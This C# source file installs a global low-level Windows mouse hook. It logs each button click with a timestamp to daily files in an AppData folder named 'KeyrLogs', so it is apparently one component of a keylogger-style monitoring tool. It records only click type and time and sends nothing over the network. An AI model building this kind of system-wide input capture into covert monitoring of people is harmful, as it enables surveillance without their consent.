using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;

namespace ServiceApp
{
    public static class MouseHook
    {
        private const int WH_MOUSE_LL = 14;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_RBUTTONDOWN = 0x0204;
        private const int WM_MBUTTONDOWN = 0x0207;

        private static StringBuilder buffer = new StringBuilder();
        private static IntPtr _hookId = IntPtr.Zero;
        private static LowLevelMouseProc _proc = HookCallback;
        private static System.Timers.Timer timer;

        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static void StartHook()
        {
            _hookId = SetHook(_proc);

            timer = new System.Timers.Timer(5000); // Salvare la 5 secunde pentru mouse
            timer.Elapsed += Timer_Elapsed;
            timer.AutoReset = true;
            timer.Start();
        }

        public static void StopHook()
        {
            UnhookWindowsHookEx(_hookId);
            timer?.Stop();
            timer?.Dispose();
        }

        private static IntPtr SetHook(LowLevelMouseProc proc)
        {
            using var curProcess = Process.GetCurrentProcess();
            using var curModule = curProcess.MainModule;
            return SetWindowsHookEx(WH_MOUSE_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                string buttonClicked = "";
                if (wParam == (IntPtr)WM_LBUTTONDOWN) buttonClicked = "L-CLICK";
                else if (wParam == (IntPtr)WM_RBUTTONDOWN) buttonClicked = "R-CLICK";
                else if (wParam == (IntPtr)WM_MBUTTONDOWN) buttonClicked = "M-CLICK";

                if (!string.IsNullOrEmpty(buttonClicked))
                {
                    string timestamp = DateTime.Now.ToString("HH:mm:ss");
                    lock (buffer) // Siguranță pentru multi-threading
                    {
                        buffer.AppendLine($"{buttonClicked}:{timestamp}");
                    }
                    Debug.WriteLine($"Mouse: {buttonClicked} at {timestamp}");
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            string data;
            lock (buffer)
            {
                if (buffer.Length == 0) return;
                data = buffer.ToString();
                buffer.Clear();
            }

            string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "KeyrLogs", "Mouse");
            if (!Directory.Exists(folder)) Directory.CreateDirectory(folder);

            string file = Path.Combine(folder, DateTime.Now.ToString("yyyy-MM-dd") + "_mouse.txt");
            File.AppendAllText(file, data);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}